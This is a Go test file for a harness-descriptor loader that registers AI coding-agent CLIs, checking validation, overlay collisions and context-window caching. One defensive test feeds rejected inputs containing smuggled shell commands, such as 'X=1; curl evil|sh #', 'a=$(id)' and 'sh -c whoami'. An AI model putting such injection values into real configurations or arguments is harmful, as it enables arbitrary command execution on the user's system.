package harness

import (
	"bytes"
	"encoding/json"
	"os"
	"path/filepath"
	"reflect"
	"strings"
	"testing"
	"time"
)

func repoRoot(t *testing.T) string {
	t.Helper()
	root, err := filepath.Abs(filepath.Join("..", "..", "..", ".."))
	if err != nil {
		t.Fatal(err)
	}
	return root
}

func markRepo(t *testing.T, root string) {
	t.Helper()
	if err := os.MkdirAll(filepath.Join(root, ".vrooli"), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(root, repoMarker), []byte("{}"), 0o644); err != nil {
		t.Fatal(err)
	}
}

func writeManifest(t *testing.T, root, resource, block string) {
	t.Helper()
	dir := filepath.Join(root, "resources", resource)
	if err := os.MkdirAll(dir, 0o755); err != nil {
		t.Fatal(err)
	}
	manifest := `{"name":"` + resource + `","execution":{"runner_type":"` + resource + `"},"harness":` + block + `}`
	if err := os.WriteFile(filepath.Join(dir, "resource.json"), []byte(manifest), 0o644); err != nil {
		t.Fatal(err)
	}
}

const sixthBlock = `{"id":"sixth","binary":"sixth-cli","display_name":"Sixth","icon":"sixth","home_isolation":{"kind":"none"},
	"usage_windows":[{"id":"daily","minutes":1440}],
	"features":{"context_limit":{"kind":"env","key":"SIXTH_LIMIT","minimum":200000},"provider_selection":false,"resume":true,"goal_mode":false,"mcp":false,"hooks":false}}`

// The snapshot serves binaries that run without the repository, so it must
// equal what the resources declare. Regenerate it with `go generate`.
func TestBuiltinSnapshotMatchesResources(t *testing.T) {
	loaded, err := Load(repoRoot(t))
	if err != nil {
		t.Fatal(err)
	}
	var want bytes.Buffer
	encoder := json.NewEncoder(&want)
	encoder.SetIndent("", "  ")
	if err := encoder.Encode(loaded.All()); err != nil {
		t.Fatal(err)
	}
	if os.Getenv("VROOLI_UPDATE_HARNESS_SNAPSHOT") == "1" {
		if err := os.WriteFile("builtin.json", want.Bytes(), 0o644); err != nil {
			t.Fatal(err)
		}
		return
	}
	if !bytes.Equal(want.Bytes(), builtinJSON) {
		t.Fatalf("builtin.json disagrees with resources/*/resource.json; run `go generate ./agentcatalog/harness`\nwant:\n%s", want.String())
	}
}

func TestEveryRunnableResourceDeclaresAHarness(t *testing.T) {
	root := repoRoot(t)
	paths, err := filepath.Glob(filepath.Join(root, "resources", "*", "resource.json"))
	if err != nil {
		t.Fatal(err)
	}
	loaded, err := Load(root)
	if err != nil {
		t.Fatal(err)
	}
	checked := 0
	for _, path := range paths {
		data, err := os.ReadFile(path)
		if err != nil {
			t.Fatal(err)
		}
		var manifest struct {
			Name      string `json:"name"`
			Execution struct {
				RunnerType string `json:"runner_type"`
			} `json:"execution"`
		}
		if err := json.Unmarshal(data, &manifest); err != nil {
			t.Fatal(err)
		}
		if manifest.Execution.RunnerType == "" {
			continue
		}
		checked++
		descriptor, ok := loaded.Lookup(manifest.Name)
		if !ok || descriptor.Resource != manifest.Name {
			t.Errorf("%s has a runner type but no harness descriptor", manifest.Name)
		}
	}
	if checked == 0 {
		t.Fatal("no runnable resources were found")
	}
}

func TestLookupAnswersToEveryDeclaredName(t *testing.T) {
	set := Builtin()
	for _, name := range []string{"claude", "claude-code", " CLAUDE ", "Claude-Code"} {
		if descriptor, ok := set.Lookup(name); !ok || descriptor.Resource != "claude-code" || descriptor.Binary != "claude" {
			t.Errorf("Lookup(%q) = %+v, %t", name, descriptor, ok)
		}
	}
	for _, name := range []string{"agy", "antigravity"} {
		if descriptor, ok := set.Lookup(name); !ok || descriptor.Resource != "antigravity" || descriptor.Binary != "agy" {
			t.Errorf("Lookup(%q) = %+v, %t", name, descriptor, ok)
		}
	}
	if _, ok := set.Lookup("sh -c whoami"); ok {
		t.Fatal("Lookup accepted an undeclared name")
	}
	if _, ok := set.ByID("claude-code"); ok {
		t.Fatal("ByID must match the agent ID only")
	}
}

func TestLoadRejectsAnUnsafeOrAmbiguousDescriptor(t *testing.T) {
	for name, block := range map[string]string{
		"path as binary":              strings.Replace(sixthBlock, `"sixth-cli"`, `"/tmp/evil"`, 1),
		"unknown field":               strings.Replace(sixthBlock, `"icon":"sixth"`, `"icon":"sixth","surprise":true`, 1),
		"bad limit kind":              strings.Replace(sixthBlock, `"kind":"env","key"`, `"kind":"shell","key"`, 1),
		"unknown source":              strings.Replace(sixthBlock, `"provider_selection"`, `"context_window_source":"guess","provider_selection"`, 1),
		"zero window":                 strings.Replace(sixthBlock, `"minutes":1440`, `"minutes":0`, 1),
		"bad home":                    strings.Replace(sixthBlock, `"home_isolation":{"kind":"none"}`, `"home_isolation":{"kind":"env"}`, 1),
		"shared dir climb":            strings.Replace(sixthBlock, `"home_isolation":{"kind":"none"}`, `"home_isolation":{"kind":"env","env":"X","state_dir":"x","layout":"mirror","shared_dir":"../x"}`, 1),
		"limit key with shell syntax": strings.Replace(sixthBlock, `"SIXTH_LIMIT"`, `"X=1; curl evil|sh #"`, 1),
		"env limit key not a name":    strings.Replace(sixthBlock, `"SIXTH_LIMIT"`, `"sixth-limit"`, 1),
		"arg limit key with shell":    strings.Replace(sixthBlock, `"kind":"env","key":"SIXTH_LIMIT"`, `"kind":"arg","key":"a=$(id)"`, 1),
		"flag with shell syntax":      strings.Replace(sixthBlock, `"provider_selection"`, `"model_selection":{"flag":"--model; id","sources":["s"]},"provider_selection"`, 1),
		"flag without a dash":         strings.Replace(sixthBlock, `"provider_selection"`, `"model_selection":{"flag":"model","sources":["s"]},"provider_selection"`, 1),
		"session env not a name":      strings.Replace(sixthBlock, `"icon":"sixth"`, `"icon":"sixth","session_env":["A B"]`, 1),
		"claims a binary":             strings.Replace(sixthBlock, `"sixth-cli"`, `"other"`, 1),
	} {
		t.Run(name, func(t *testing.T) {
			root := t.TempDir()
			writeManifest(t, root, "other", strings.NewReplacer(`"sixth-cli"`, `"other"`, `"id":"sixth"`, `"id":"other"`).Replace(sixthBlock))
			writeManifest(t, root, "sixth", block)
			if _, err := Load(root); err == nil {
				t.Fatal("Load accepted the descriptor")
			}
		})
	}
}

func TestActiveTakesANewResourceFromItsDirectoryAlone(t *testing.T) {
	root := t.TempDir()
	markRepo(t, root)
	writeManifest(t, root, "sixth", sixthBlock)
	t.Setenv("VROOLI_RESOURCE_ROOT", root)
	active := Active()
	if descriptor, ok := active.ByID("sixth"); !ok || descriptor.Binary != "sixth-cli" {
		t.Fatalf("sixth harness not active: %+v", active.All())
	}
	if _, ok := active.ByID("claude"); !ok {
		t.Fatal("a resource root without the other harnesses must keep the snapshot's")
	}
}

func TestActiveKeepsTheSnapshotWhenAManifestIsMalformed(t *testing.T) {
	root := t.TempDir()
	markRepo(t, root)
	writeManifest(t, root, "claude-code", strings.Replace(sixthBlock, `"sixth-cli"`, `"/tmp/evil"`, 1))
	t.Setenv("VROOLI_RESOURCE_ROOT", root)
	descriptor, ok := Active().ByID("claude")
	if !ok || descriptor.Binary != "claude" {
		t.Fatalf("got %+v, %t", descriptor, ok)
	}
}

func TestActiveIgnoresARootThatIsNotTheRepository(t *testing.T) {
	root := t.TempDir()
	writeManifest(t, root, "sixth", sixthBlock)
	t.Setenv("VROOLI_RESOURCE_ROOT", root)
	t.Setenv("VROOLI_ROOT", "")
	if _, ok := Active().ByID("sixth"); ok {
		t.Fatal("a directory with no repository marker supplied a harness")
	}

	// An unmarked first root does not hide a real second one.
	repository := t.TempDir()
	markRepo(t, repository)
	writeManifest(t, repository, "seventh", strings.NewReplacer(`"id":"sixth"`, `"id":"seventh"`, `"sixth-cli"`, `"seventh"`).Replace(sixthBlock))
	t.Setenv("VROOLI_ROOT", repository)
	if _, ok := Active().ByID("seventh"); !ok {
		t.Fatal("the marked root was not read")
	}
}

func TestActiveRefusesAnOverlayThatCollidesWithAnotherHarness(t *testing.T) {
	root := t.TempDir()
	markRepo(t, root)
	writeManifest(t, root, "impostor", strings.NewReplacer(`"id":"sixth"`, `"id":"impostor"`, `"sixth-cli"`, `"claude"`).Replace(sixthBlock))
	writeManifest(t, root, "codex", strings.NewReplacer(`"id":"sixth"`, `"id":"codex"`, `"sixth-cli"`, `"grok"`).Replace(sixthBlock))
	t.Setenv("VROOLI_RESOURCE_ROOT", root)
	active := Active()
	if descriptor, _ := active.Lookup("claude"); descriptor.Resource != "claude-code" {
		t.Fatalf("claude resolved to %+v", descriptor)
	}
	if _, ok := active.ByID("impostor"); ok {
		t.Fatal("a colliding resource was added")
	}
	if descriptor, _ := active.ByID("codex"); descriptor.Binary != "codex" {
		t.Fatalf("a colliding replacement kept: %+v", descriptor)
	}
}

func TestOverlayResolvesACollisionDeterministically(t *testing.T) {
	first := Descriptor{Resource: "alpha", ID: "same", Binary: "alpha"}
	second := Descriptor{Resource: "beta", ID: "same", Binary: "beta"}
	for range 50 {
		got := overlay(Builtin(), []Descriptor{second, first})
		if descriptor, ok := got.ByID("same"); !ok || descriptor.Resource != "alpha" {
			t.Fatalf("got %+v, %t", descriptor, ok)
		}
		if len(got.All()) != len(Builtin().All())+1 {
			t.Fatalf("both colliding resources were kept: %+v", got.All())
		}
	}
}

func TestActiveNeverSearchesFromTheWorkingDirectory(t *testing.T) {
	root := t.TempDir()
	writeManifest(t, root, "codex", strings.Replace(sixthBlock, `"id":"sixth"`, `"id":"codex"`, 1))
	t.Setenv("VROOLI_RESOURCE_ROOT", "")
	t.Setenv("VROOLI_ROOT", "")
	t.Chdir(root)
	if descriptor, _ := Active().ByID("codex"); descriptor.Binary != "codex" {
		t.Fatalf("a project directory chose the executable: %+v", descriptor)
	}
}

func TestContextLimitOptionsNeverExceedTheWindowOrUndercutTheMinimum(t *testing.T) {
	candidates := []int64{1000000, 300000, 150000}
	withMinimum := Descriptor{Features: Features{ContextLimit: &ContextLimit{Kind: ContextLimitEnv, Key: "K", Minimum: 200000}}}
	for _, tc := range []struct {
		name   string
		d      Descriptor
		window int64
		want   []int64
	}{
		{"large window", withMinimum, 1000000, []int64{1000000, 300000}},
		{"small window", withMinimum, 272000, nil},
		{"unknown window keeps what the harness accepts", withMinimum, 0, []int64{1000000, 300000}},
		{"no support", Descriptor{}, 1000000, nil},
	} {
		t.Run(tc.name, func(t *testing.T) {
			if got := tc.d.ContextLimitOptions(tc.window, candidates); !reflect.DeepEqual(got, tc.want) {
				t.Fatalf("got %v, want %v", got, tc.want)
			}
		})
	}
}

func TestRecordedClaudeWindowResolvesByExactModelAndSurvivesOtherModels(t *testing.T) {
	path := filepath.Join(t.TempDir(), "nested", "windows.json")
	t.Setenv(ModelWindowsEnv, path)
	now := time.Date(2026, 10, 30, 12, 0, 0, 0, time.UTC)
	for model, tokens := range map[string]int64{"claude-opus-5-5": 1000000, "claude-haiku-5-5": 200000} {
		if err := RecordModelWindow(path, model, tokens, now); err != nil {
			t.Fatal(err)
		}
	}
	claude := Descriptor{Features: Features{ContextWindowSource: WindowSourceClaudeStatusline}}
	if got := claude.ContextWindowTokens("opus", "claude-opus-5-5"); got != 1000000 {
		t.Fatalf("got %d", got)
	}
	if got := claude.ContextWindowTokens("claude-haiku-5-5"); got != 200000 {
		t.Fatalf("got %d", got)
	}
	if got := claude.ContextWindowTokens("claude-opus-5-5[1m]", "claude-sonnet-5-5"); got != 0 {
		t.Fatalf("an unreported model must stay unknown, got %d", got)
	}
}

func TestRecordModelWindowWritesOnlyOnChange(t *testing.T) {
	path := filepath.Join(t.TempDir(), "windows.json")
	first := time.Date(2026, 10, 30, 12, 0, 0, 0, time.UTC)
	for _, write := range []struct {
		tokens int64
		at     time.Time
		want   time.Time
	}{
		{200000, first, first},
		{200000, first.Add(time.Hour), first},
		{1000000, first.Add(2 * time.Hour), first.Add(2 * time.Hour)},
	} {
		if err := RecordModelWindow(path, "claude-sonnet-5-5", write.tokens, write.at); err != nil {
			t.Fatal(err)
		}
		got := readModelWindowRecord(path).Models["claude-sonnet-5-5"]
		if got.ContextWindowTokens != write.tokens || !got.ObservedAt.Equal(write.want) {
			t.Fatalf("after %+v got %+v", write, got)
		}
	}
	entries, err := os.ReadDir(filepath.Dir(path))
	if err != nil || len(entries) != 1 {
		t.Fatalf("temporary files were left behind: %v, %v", entries, err)
	}
}

func TestRecordModelWindowIgnoresUnusableValuesAndStaysBounded(t *testing.T) {
	path := filepath.Join(t.TempDir(), "windows.json")
	base := time.Date(2026, 10, 30, 12, 0, 0, 0, time.UTC)
	for _, tc := range []struct {
		model  string
		tokens int64
	}{{"", 1000}, {"m", 0}, {"m", -5}, {strings.Repeat("m", maxModelIDLength+1), 1000}} {
		if err := RecordModelWindow(path, tc.model, tc.tokens, base); err != nil {
			t.Fatal(err)
		}
	}
	if _, err := os.Stat(path); !os.IsNotExist(err) {
		t.Fatalf("an unusable value created the record: %v", err)
	}
	for i := range maxRecordedModels + 5 {
		if err := RecordModelWindow(path, "model-"+string(rune('a'+i%26))+string(rune('a'+i/26)), 1000, base.Add(time.Duration(i)*time.Minute)); err != nil {
			t.Fatal(err)
		}
	}
	record := readModelWindowRecord(path)
	if len(record.Models) != maxRecordedModels {
		t.Fatalf("got %d models", len(record.Models))
	}
	if _, kept := record.Models["model-aa"]; kept {
		t.Fatal("the oldest model should have been dropped")
	}
}

func TestCodexWindowsComeFromTheCacheInCodexHome(t *testing.T) {
	home := t.TempDir()
	t.Setenv("CODEX_HOME", home)
	codex := Descriptor{Features: Features{ContextWindowSource: WindowSourceCodexModelsCache}}
	if got := codex.ContextWindowTokens("gpt-6-luna"); got != 0 {
		t.Fatalf("a missing cache must be unknown, got %d", got)
	}
	cache := `{"models":[{"slug":"gpt-6-luna","context_window":272000,"max_context_window":872000},{"slug":"gpt-6.1-terra","context_window":500000},{"slug":"no-window"}]}`
	if err := os.WriteFile(filepath.Join(home, "models_cache.json"), []byte(cache), 0o644); err != nil {
		t.Fatal(err)
	}
	for model, want := range map[string]int64{"gpt-6-luna": 272000, "gpt-6.1-terra": 500000, "no-window": 0, "unlisted": 0} {
		if got := codex.ContextWindowTokens(model); got != want {
			t.Errorf("%s: got %d, want %d", model, got, want)
		}
	}
	if err := os.WriteFile(filepath.Join(home, "models_cache.json"), []byte(`{"models":`), 0o644); err != nil {
		t.Fatal(err)
	}
	if got := codex.ContextWindowTokens("gpt-6-luna"); got != 0 {
		t.Fatalf("a corrupt cache must be unknown, got %d", got)
	}
}

func TestHarnessWithoutAWindowSourceIsUnknown(t *testing.T) {
	if got := (Descriptor{}).ContextWindowTokens("anything"); got != 0 {
		t.Fatalf("got %d", got)
	}
}
